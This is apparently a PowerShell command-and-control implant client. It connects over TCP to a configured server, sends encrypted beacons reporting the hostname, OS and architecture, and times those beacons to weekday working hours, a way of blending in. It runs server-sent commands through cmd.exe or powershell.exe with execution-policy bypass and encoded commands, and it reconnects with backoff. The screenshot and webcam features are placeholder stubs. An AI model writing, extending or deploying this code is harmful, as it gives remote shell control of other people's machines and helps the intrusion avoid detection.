# Globals
$global:client = $null
$global:beaconIntervalInstance = $null
$global:logStream = $null
$global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
$global:exitProcess = $false
$global:SESSION_ID = $null
$global:LOGGING = $true
$global:CVER = "0.3.0"
$global:TYPE = "ps"
$global:CHUNK_SIZE = 1024
$global:SERVER_ADDRESS = 'localhost'
$global:SERVER_PORT = 54678
$global:MAX_RETRIES = 5
$global:RETRY_INTERVALS = @(
    [uint32]10000,
    [uint32]30000,
    [uint32](1 * 60 * 1000),
    [uint32](2 * 60 * 1000),
    [uint32](4 * 60 * 1000),
    [uint32](6 * 60 * 1000)
)
$global:BEACON_MIN_INTERVAL = 5 * 60 * 1000
$global:BEACON_MAX_INTERVAL = 45 * 60 * 1000

# Handle SIGINT (Ctrl+C)
$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    Log-It 'Received exit signal, shutting down gracefully'
    if ($global:client) {
        $global:client.Close()
    }
    $global:exitProcess = $true
}

$null = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action {
    Log-It 'Received SIGINT (Ctrl+C), shutting down gracefully'
    if ($global:client) {
        $global:client.Close()
    }
    $global:exitProcess = $true
    [Environment]::Exit(0)
}

# Create a writable stream for logging
if ($global:LOGGING) {
    $logPath = 'logs\client.log'
    $logDir = [System.IO.Path]::GetDirectoryName($logPath)
    if (-not (Test-Path -Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    $global:logStream = New-Object System.IO.StreamWriter($logPath, $true)
}

function Log-It {
    param (
        [string]$message
    )
    if ($global:LOGGING -and $global:logStream) {
        $timestamp = (Get-Date).ToUniversalTime().ToString("o")
        $global:logStream.WriteLine("[$timestamp] $message")
        $global:logStream.Flush()
    }
}

function Get-SessionId {
    try {
        if (-not $global:client -or -not $global:client.Client -or -not $global:client.Client.RemoteEndPoint) {
            throw [Exception]::new("Client is not properly initialized.")
        }
        $ipAddress = $global:client.Client.RemoteEndPoint.Address.ToString()
        if ($ipAddress -eq "::1") {
            $ipAddress = "127.0.0.1"
        }
        Log-It "IP Address: $ipAddress"
        $sumIp = 0
        $ipAddress.Split(".") | ForEach-Object {
            $sumIp += [int]$_
        }
        $hashObject = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sumIp"))
        $crypt = [BitConverter]::ToString($hashObject).Replace("-", "").Substring(0, 32).ToLower()
        $global:SESSION_ID = $crypt
        Log-It "Session ID: $global:SESSION_ID"
    } catch {
        Log-It "Error getting session ID: $_"
    }
}

function Encrypt-Data {
    param (
        [string]$data,
        [string]$sharedKey
    )
    try {
        $salt = [byte[]]::new(32)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
        $iv = [byte[]]::new(12)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
            $sharedKey, 
            $salt, 
            200000, 
            [System.Security.Cryptography.HashAlgorithmName]::SHA512
        ).GetBytes(32)
        $aes = [System.Security.Cryptography.AesGcm]::new($key)
        $dataBytes = [Text.Encoding]::UTF8.GetBytes($data)
        $ciphertext = [byte[]]::new($dataBytes.Length)
        $authTag = [byte[]]::new(16)
        $aes.Encrypt($iv, $dataBytes, $ciphertext, $authTag)
        $saltBase64 = [Convert]::ToBase64String($salt)
        $ivBase64 = [Convert]::ToBase64String($iv)
        $authTagBase64 = [Convert]::ToBase64String($authTag)
        $ciphertextBase64 = [Convert]::ToBase64String($ciphertext)
        return "${saltBase64}:${ivBase64}:${authTagBase64}:${ciphertextBase64}"
    }
    catch {
        Write-Error "Error in Encrypt-Data: $_"
        throw
    }
}

function Decrypt-Data {
    param (
        [string]$encrypted,
        [string]$sharedKey
    )
    try {
        $parts = $encrypted -split ':'
        if ($parts.Length -ne 4) {
            throw "Invalid encrypted data format."
        }
        $salt = [Convert]::FromBase64String($parts[0])
        $iv = [Convert]::FromBase64String($parts[1])
        $authTag = [Convert]::FromBase64String($parts[2])
        $encryptedData = [Convert]::FromBase64String($parts[3])
        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
            $sharedKey, 
            $salt, 
            200000, 
            [System.Security.Cryptography.HashAlgorithmName]::SHA512
        ).GetBytes(32)
        $aes = [System.Security.Cryptography.AesGcm]::new($key)
        $plaintext = [byte[]]::new($encryptedData.Length)
        $aes.Decrypt($iv, $encryptedData, $authTag, $plaintext)
        return [Text.Encoding]::UTF8.GetString($plaintext)
    }
    catch {
        Write-Error "Error in Decrypt-Data: $_"
        throw
    }
}

function Get-RetryInterval {
    param ($retries)
    if ($retries -lt $global:RETRY_INTERVALS.Length) {
        return $global:RETRY_INTERVALS[$retries]
    }
    return 0
}

function Send-Command {
    param ($response)
    $encrypted = Encrypt-Data -data $response -sharedKey $global:SESSION_ID
    if ($encrypted.Length -ge $global:CHUNK_SIZE) {
        while ($encrypted.Length -gt 0) {
            $chunk = $encrypted.Substring(0, [Math]::Min($global:CHUNK_SIZE, $encrypted.Length))
            $encrypted = $encrypted.Substring($chunk.Length)
            if ($encrypted.Length -eq 0) {
                $chunk += '--FIN--'
            }
            Log-It "Sent Chunk: $chunk"
            $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
        }
    }
    else {
        Log-It "Sent Data: $encrypted"
        $global:client.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
    }
}

function Send-Beacon {
    $response = @{
        response = @{
            beacon = $true
            version = $global:CVER
            type = $global:TYPE
            platform = [System.Environment]::OSVersion.Platform.ToString()
            arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
            osver = [System.Environment]::OSVersion.VersionString
            hostname = [System.Environment]::MachineName
        }
    }
    Send-Command -response $response
}

function Start-Sleep {
    param ([int]$milliseconds)
    [System.Threading.Thread]::Sleep($milliseconds)
}

function Format-FileName {
    param ($name, $extension)
    $now = Get-Date
    return "$name`_$($now.ToString('yyyy-MM-dd_HH-mm-ss')).$($extension -replace '\.', '')"
}

function Run-WebcamClip {
    try {
        # Placeholder for webcam capture
        $fileName = Format-FileName -name 'wc' -extension 'jpg'
        # Simulate webcam capture
        [byte[]]$fakeImageData = [System.Text.Encoding]::UTF8.GetBytes("Fake webcam image data")
        Send-Command @{
            response = @{
                download = $fileName
                data = [Convert]::ToBase64String($fakeImageData)
            }
        }
    }
    catch {
        Send-Command @{
            response = @{
                error = "Failed to capture webcam: $($_.Exception.Message)"
            }
        }
    }
}

function Run-Screenshot {
    try {
        # Placeholder for screenshot capture
        $fileName = Format-FileName -name 'ss' -extension 'jpg'
        # Simulate screenshot capture
        [byte[]]$fakeScreenshotData = [System.Text.Encoding]::UTF8.GetBytes("Fake screenshot data")
        Send-Command @{
            response = @{
                download = $fileName
                data = [Convert]::ToBase64String($fakeScreenshotData)
            }
        }
    }
    catch {
        Send-Command @{
            response = @{
                error = "Failed to capture screenshot: $($_.Exception.Message)"
            }
        }
    }
}

function Run-Command {
    param ($command, $payload, $isFile = $false)
    try {
        $command = $command.Trim()
        if ([string]::IsNullOrWhiteSpace($command)) {
            throw "No command provided."
        }
        if ($command -notin @('cmd', 'ps')) {
            throw "Unsupported command."
        }
        $processArgs = @{
            FilePath = if ($command -eq "cmd") { "cmd.exe" } else { "powershell.exe" }
            ArgumentList = @()
            NoNewWindow = $true
            Wait = $true
            RedirectStandardOutput = "out.txt"
            RedirectStandardError = "err.txt"
        }
        if ($command -eq "cmd") {
            if ($payload -match '[;&|]') {
                throw "Invalid characters in payload."
            }
            $processArgs.ArgumentList += @('/c', $payload)
        }
        else {
            $processArgs.ArgumentList += @(
                '-NonInteractive',
                '-NoLogo',
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass'
            )
            if ($isFile) {
                $processArgs.ArgumentList += @('-File', $payload)
            }
            else {
                $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
                $processArgs.ArgumentList += @('-EncodedCommand', $encodedCmd)
            }
        }
        $process = Start-Process @processArgs -PassThru
        $process | Wait-Process
        $output = Get-Content -Path "out.txt" -Raw
        $errorOutput = Get-Content -Path "err.txt" -Raw
        
        if ($process.ExitCode -ne 0) {
            throw "Command failed with code $($process.ExitCode). Error output: $errorOutput"
        }
        
        return $output.Trim()
    }
    catch {
        throw "Failed to execute command: $($_.Exception.Message)"
    }
    finally {
        Remove-Item -Path "out.txt", "err.txt" -ErrorAction SilentlyContinue
    }
}

function Format-Time {
    param ([int]$milliseconds)
    $totalSeconds = [Math]::Floor($milliseconds / 1000)
    $days = [Math]::Floor($totalSeconds / 86400)
    $hours = [Math]::Floor(($totalSeconds % 86400) / 3600)
    $minutes = [Math]::Floor(($totalSeconds % 3600) / 60)
    $seconds = $totalSeconds % 60
    return "$days`d $hours`h $minutes`m $seconds`s"
}

function Get-Uptime {
    $currentTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $uptimeMillis = $currentTime - $global:startTime
    $uptime = Format-Time -milliseconds $uptimeMillis
    Send-Command @{ response = @{ data = $uptime } }
}

function Parse-Action {
    param ($action)
    try {
        $parts = $action.Trim() -split '\s+(?=(?:[^"]*"[^"]*")*[^"]*$)'
        $command, $properties = $parts[0], $parts[1..$parts.Length]
        Log-It "Command: $command - Properties: $($properties -join ' ')"
        $payload = $null
        switch ($command) {
            { $_ -in 'ps', 'cmd' } {
                $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($properties[0]))
            }
            'up' {
                Get-Uptime
                return
            }
            'di' {
                $global:exitProcess = $true
                exit
            }
            'ss' {
                Run-Screenshot
                return
            }
            'wc' {
                Run-WebcamClip
                return
            }
        }
        $result = Run-Command -command $command -payload $payload
        Send-Command @{ response = @{ data = $result } }
    }
    catch {
        Send-Command @{ response = @{ error = "Error: $($_.Exception.Message)" } }
    }
}

function Connect-ToServer {
    $connectionRetries = 0
    $shouldContinue = $true

    while ($shouldContinue) {
        try {
            $global:client = New-Object System.Net.Sockets.TcpClient
            $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
            Log-It "Client $global:CVER connected."
            Get-SessionId
            Send-Beacon
            $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
            $global:beaconIntervalInstance = New-Object System.Timers.Timer($beaconInterval)
            $global:beaconIntervalInstance.AutoReset = $true
            $global:beaconIntervalInstance.Enabled = $true
            Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -Action {
                $now = Get-Date
                $day = $now.DayOfWeek.value__
                $hour = $now.Hour
                if ($day -ge 1 -and $day -le 5 -and $hour -ge 7 -and $hour -le 19) {
                    Send-Beacon
                }
            } | Out-Null
            $stream = $global:client.GetStream()
            $buffer = New-Object byte[] $global:CHUNK_SIZE
            while ($true) {
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                if ($bytesRead -eq 0) { break }
                $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                Log-It "Received Data: $data"
                $action = Decrypt-Data -encrypted $data -sharedKey $global:SESSION_ID
                if ($action) {
                    Parse-Action -action $action
                }
            }
        }
        catch {
            Log-It "Exception: $($_.Exception.Message)"
        }
        finally {
            Log-It 'Connection to server closing.'
            if ($global:beaconIntervalInstance) {
                $global:beaconIntervalInstance.Stop()
                $global:beaconIntervalInstance.Dispose()
            }
            if ($global:exitProcess) {
                $shouldContinue = $false
            }
            else {
                $connectionRetries++
                if ($connectionRetries -gt $global:MAX_RETRIES) {
                    Log-It 'Max retries reached. Exiting.'
                    Start-Sleep -Milliseconds ($global:BEACON_MAX_INTERVAL * 8)
                    $shouldContinue = $false
                }
                else {
                    $retryInterval = Get-RetryInterval -retries $connectionRetries
                    Log-It "Attempting to reconnect in $($retryInterval / 1000) seconds..."
                    Start-Sleep -Milliseconds $retryInterval
                    if ($global:client) {
                        $global:client.Close()
                    }
                }
            }
        }
    }
}

Connect-ToServer